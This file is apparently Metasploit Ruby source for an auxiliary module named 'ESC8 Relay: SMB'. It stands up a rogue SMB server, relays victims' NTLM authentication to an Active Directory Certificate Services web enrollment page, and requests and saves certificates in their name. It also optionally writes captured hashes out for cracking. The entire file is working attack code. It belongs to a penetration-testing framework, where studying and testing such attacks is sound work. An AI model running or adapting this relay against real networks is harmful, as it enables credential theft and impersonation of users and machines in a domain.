##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb'
require 'ruby_smb/gss/provider/ntlm'

class MetasploitModule < Msf::Auxiliary
  include ::Msf::Exploit::Remote::SMB::Server
  include ::Msf::Exploit::Remote::SMB::Server::HttpRelay

  def initialize
    super({
      'Name' => 'ESC8 Relay: SMB',
      'Description' => %q{
      This module creates an SMB server and then relays the credentials passed to it
      to an HTTP server to gain an authenticated connection.  Once that connection is
      established, the module makes an authenticated request for a certificate based
      on a given template.
      },
      'Author' => [
        'bwatters-r7',
        'jhicks-r7' # query for available certs
      ],
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
      'PassiveActions' => [ 'Relay' ],
      'DefaultAction' => 'Relay'
    })

    register_options(
      [
        OptString.new('CAINPWFILE', [ false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil ]),
        OptString.new('JOHNPWFILE', [ false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil ]),
        OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for if MODE is SPECIFIC_TEMPLATE.', nil ]),
        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
        OptEnum.new('MODE', [ true, 'Capture Mode', 'AUTO', %w[ALL AUTO QUERY_ONLY SPECIFIC_TEMPLATE]]),
        OptAddress.new('RELAY_TARGET', [true, 'Target address range or CIDR identifier to relay to'], aliases: ['SMBHOST']),
        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
        OptInt.new('TIMEOUT', [ true, 'Seconds to wait for a response.', 20])
      ]
    )
    deregister_options('SMBServerIdleTimeout',
                       'RHOSTS',
                       'SMBPass',
                       'SMBUser',
                       'CommandShellCleanupCommand',
                       'AutoVerifySession',
                       'HttpUsername',
                       'HttpPassword')
  end

  @dialects = [
    RubySMB::Client::SMB1_DIALECT_SMB1_DEFAULT,

    RubySMB::Client::SMB2_DIALECT_0202,
    RubySMB::Client::SMB2_DIALECT_0210,
    RubySMB::Client::SMB2_DIALECT_0300,
    RubySMB::Client::SMB2_DIALECT_0302,
  ]

  def initial_handshake?
    res = send_request_cgi(
      {
        'rhost' => datastore['RELAY_TARGET'],
        'method' => 'GET',
        'uri' => normalize_uri(datastore['CERT_URI']),
        'headers' => {
          'Accept-Encoding' => 'identity'
        }
      }
    )

    return false if res.nil? || res.code != 401

    true
  end

  def check_options
    case datastore['MODE']
    when 'SPECIFIC_TEMPLATE'
      if datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
        fail_with(Failure::BadConfig, 'CERT_TEMPLATE must be set in AUTO and SPECIFIC_TEMPLATE mode')
      end
    when 'ALL', 'AUTO', 'QUERY_ONLY'
      unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
        print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
      end
    end
  end

  def start_service(opts = {})
    check_options
    @issued_certs = {}
    unless initial_handshake?
      fail_with(Failure::UnexpectedReply, "#{datastore['RELAY_TARGET']} does not appear to have Web Enrollment enabled on #{datastore['CERT_URI']}")
    end

    ntlm_provider = HTTPRelayNTLMProvider.new(
      listener: self
    )

    # Set domain name for all future server responses
    ntlm_provider.dns_domain = datastore['SMBDomain']
    ntlm_provider.dns_hostname = datastore['SMBDomain']
    ntlm_provider.netbios_domain = datastore['SMBDomain']
    ntlm_provider.netbios_hostname = datastore['SMBDomain']
    validate_smb_hash_capture_datastore(datastore, ntlm_provider)
    opts[:gss_provider] = ntlm_provider
    opts[:dialects] = [
      RubySMB::Client::SMB1_DIALECT_SMB1_DEFAULT,

      RubySMB::Client::SMB2_DIALECT_0202,
      RubySMB::Client::SMB2_DIALECT_0210,
      RubySMB::Client::SMB2_DIALECT_0300,
      RubySMB::Client::SMB2_DIALECT_0302,
    ]
    super(opts)
  end

  def on_client_connect(_client)
    @login_uri = normalize_uri("#{datastore['CERT_URI']}/csertfnsh.asp")
    @http_timeout = datastore['TIMEOUT']
    print_good('Received SMB connection on ESC8 Relay Server!')
  end

  alias run exploit

  def create_csr(private_key, cert_template)
    vprint_status('Generating CSR...')
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
      ['CN', cert_template, OpenSSL::ASN1::UTF8STRING]
    ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    vprint_status('CSR Generated')
    request
  end

  def post_login_action(kwargs = {})
    authenticated_user = kwargs[:authenticated_username]
    authenticated_http_client = kwargs[:authenticated_http_client]
    authenticated_domain = kwargs[:authenticated_domain]

    if authenticated_user.nil?
      print_error('esc8_relay: Post Login Action requires an authenticated username')
      return nil
    end
    if authenticated_http_client.nil?
      print_error('esc8_relay: Failed to authenticate')
      return nil
    end
    if authenticated_domain.nil?
      print_error('esc8_relay: Post Login Action requires an authenticated domain')
      return nil
    end

    case datastore['MODE']
    when 'AUTO'
      cert_template = 'User'
      cert_template = 'Computer' if authenticated_user[-1] == '$'
      retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
    when 'ALL', 'QUERY_ONLY'
      cert_list = get_cert_list(authenticated_http_client)
      unless cert_list.nil? || cert_list.empty?
        print_message = "Available Certificates for #{authenticated_domain}\\#{authenticated_user} on #{datastore['RELAY_TARGET']}:\n"
        cert_list.each do |cert_entry|
          print_message << "      #{cert_entry}\n"
        end
        print_status(print_message)
        if datastore['MODE'] == 'ALL'
          retrieve_certs(cert_list, authenticated_user, authenticated_domain, authenticated_http_client)
        end
      end
    when 'SPECIFIC_TEMPLATE'
      cert_template = datastore['CERT_TEMPLATE']
      retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
    end
    vprint_status('Relay tasks complete; waiting for next login attempt.')
  end

  def get_cert_list(authenticated_http_client)
    print_status('Retrieving available template list, this may take a few minutes')
    req = authenticated_http_client.request_raw(
      {
        'method' => 'GET',
        'uri' => "#{datastore['CERT_URI']}/certrqxt.asp"
      }
    )
    res = authenticated_http_client._send_recv(req, @http_timeout, true)
    return nil unless res&.code == 200

    raw_list = res.body.scan(/^.*Option Value="E;(.*?);/)
    cert_list = []
    raw_list.each do |element|
      cert_list.append(element[0])
    end
    print_bad('http_relay returned no available certs') if cert_list.empty?
    cert_list
  end

  def cert_entry?(authenticated_user, authenticated_domain, cert_template)
    auth_string = "#{authenticated_domain}\\#{authenticated_user}"
    return false if @issued_certs[auth_string].nil? || !@issued_certs[auth_string].include?(cert_template)

    true
  end

  def add_cert_entry(authenticated_user, authenticated_domain, cert_template)
    auth_string = "#{authenticated_domain}\\#{authenticated_user}"
    if @issued_certs.key?(auth_string)
      @issued_certs[auth_string] << cert_template
    else
      @issued_certs[auth_string] = [ cert_template ]
    end
  end

  def retrieve_certs(cert_list, authenticated_user, authenticated_domain, authenticated_http_client)
    cert_list.each do |cert_entry|
      retrieve_cert(cert_entry, authenticated_user, authenticated_domain, authenticated_http_client)
    end
  end

  def retrieve_cert(cert_template, authenticated_user, authenticated_domain, authenticated_http_client)
    if cert_entry?(authenticated_user, authenticated_domain, cert_template)
      print_status("Certificate already created for #{authenticated_domain}\\#{authenticated_user} using #{cert_template}, skipping..")
      return nil
    end

    vprint_status("Creating certificate request for #{authenticated_domain}\\#{authenticated_user} using the #{cert_template} template")
    private_key = OpenSSL::PKey::RSA.new(4096)
    request = create_csr(private_key, cert_template)
    cert_template_string = "CertificateTemplate:#{cert_template}"
    vprint_status('Requesting relay target generate certificate...')
    req = authenticated_http_client.request_cgi(
      {
        'method' => 'POST',
        'uri' => "#{datastore['CERT_URI']}/certfnsh.asp",
        'ctype' => 'application/x-www-form-urlencoded',
        'vars_post' => {
          'Mode' => 'newreq',
          'CertRequest' => request.to_s,
          'CertAttrib' => cert_template_string,
          'TargetStoreFlags' => 0,
          'SaveCert' => 'yes',
          'ThumbPrint' => ''
        }
      }
    )
    res = authenticated_http_client._send_recv(req, @http_timeout, true)
    if res&.code == 200 && !res.body.include?('request was denied')
      print_good("Certificate generated using template #{cert_template} and user #{authenticated_user}")
      add_cert_entry(authenticated_user, authenticated_domain, cert_template)
    else
      print_bad("Certificate request denied using template #{cert_template} and user #{authenticated_user}")
      return nil
    end

    location_tag = res.body.match(/^.*location="(.*)"/)[1]
    location_uri = normalize_uri("#{datastore['CERT_URI']}/#{location_tag}")
    vprint_status("Attempting to download the certificate from #{location_uri}")
    req = authenticated_http_client.request_cgi(
      {
        'method' => 'GET',
        'uri' => location_uri
      }
    )
    res = authenticated_http_client._send_recv(req, @http_timeout, true)
    info = "#{authenticated_domain}\\#{authenticated_user} Certificate"
    certificate = OpenSSL::X509::Certificate.new(res.body)
    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
    stored_path = store_loot('windows.ad.cs',
                             'application/x-pkcs12',
                             rhost,
                             pkcs12.to_der,
                             'certificate.pfx',
                             info)
    print_good("Certificate for #{authenticated_domain}\\#{authenticated_user} using template #{cert_template} saved to #{stored_path}")
    return certificate
  end

end
